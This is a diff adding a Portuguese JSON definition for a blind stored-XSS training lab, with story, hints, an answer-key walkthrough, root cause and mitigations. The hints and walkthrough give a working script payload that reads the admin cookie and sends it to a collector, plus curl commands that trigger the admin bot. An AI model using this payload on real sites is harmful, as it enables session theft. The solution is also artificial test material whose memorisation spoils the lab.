@@ -1,0 +1,81 @@
+{
+  "slug": "xss-blind-support",
+  "title": "Fila da mesa noturna",
+  "codename": "NIGHTFALL",
+  "summary": "Tickets de suporte são armazenados sem tratamento e renderizados em uma fila administrativa interna que o bot da mesa noturna abre com um cookie privilegiado. Você nunca vê a página de admin; você só vê o que retorna ao seu collector.",
+  "category": "xss",
+  "difficulty": "hard",
+  "lab_dir": "xss-blind-support",
+  "estimated_minutes": 25,
+  "xp": 340,
+  "tech": [
+    "Flask",
+    "HTML",
+    "JavaScript"
+  ],
+  "tags": [
+    "xss",
+    "stored",
+    "blind",
+    "admin-bot",
+    "exfiltration"
+  ],
+  "story": "O service desk da Nightfall aceita tickets de qualquer pessoa. Um segundo bot revisa a fila interna com sua sessão administrativa. A página do cliente só mostra o assunto, então o payload é invisível para você a menos que seu collector reporte de volta.",
+  "objective": "Armazene um script em um ticket que leia o cookie do admin e o envie para `/collect`, dispare o bot da mesa noturna e leia o valor capturado.",
+  "rules": "Permaneça na origem loopback atribuída. A fila administrativa, o bot e o collector fazem parte do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie de admin da mesa noturna",
+      "flag_type": "user",
+      "points": 340,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Armazenamento, não reflexão",
+      "body": "O campo de mensagem é salvo exatamente como enviado e depois renderizado na fila interna. Sua página nunca mostra o resultado, então use o collector como sua única prova.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Faça a fila ligar para casa",
+      "body": "Envie `<script>fetch('/collect?c='+document.cookie)</script>`. O bot da mesa noturna abre `/admin/tickets` com `admin_session` definido como a flag.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Dispare e colete",
+      "body": "Faça POST em `/report` para enviar o bot e depois GET em `/captured`. O valor armazenado em `admin_session` é a flag.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "Envie um ticket com a mensagem `<script>fetch('/collect?c='+document.cookie)</script>`. Dispare a revisão com `POST /report`. O bot carrega `/admin/tickets` com o cookie do admin, o script executa e `/collect` armazena o cookie. Leia a flag em `/captured`.\n\n```bash\ncurl -X POST http://127.0.0.1:PORT/ -d 'subject=checkout' --data-urlencode \"message=<script>fetch('/collect?c='+document.cookie)</script>\"\ncurl -X POST http://127.0.0.1:PORT/report\ncurl http://127.0.0.1:PORT/captured\n```",
+    "root_cause": "O conteúdo do ticket é persistido sem codificação e renderizado como HTML em uma interface interna acessada por um navegador privilegiado. A fila administrativa não é diretamente visível ao atacante, o que torna o ataque blind, mas a mesma injeção executa com o cookie do admin.",
+    "mitigation": "Faça encoding no momento da renderização para o contexto correto; prefira text nodes ou markdown sanitizado. Marque os cookies de sessão internos como `HttpOnly` e `SameSite`, aplique uma CSP estrita e execute ferramentas administrativas em uma origem separada com controles de defesa em profundidade."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — Stored cross-site scripting",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/stored",
+      "source_type": "official",
+      "description": "Mecânica e impacto do XSS armazenado."
+    },
+    {
+      "title": "OWASP — Cross Site Scripting Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Output encoding no momento da renderização."
+    },
+    {
+      "title": "MDN — Set-Cookie",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie",
+      "source_type": "official",
+      "description": "Atributos de cookie HttpOnly e SameSite."
+    }
+  ]
+}
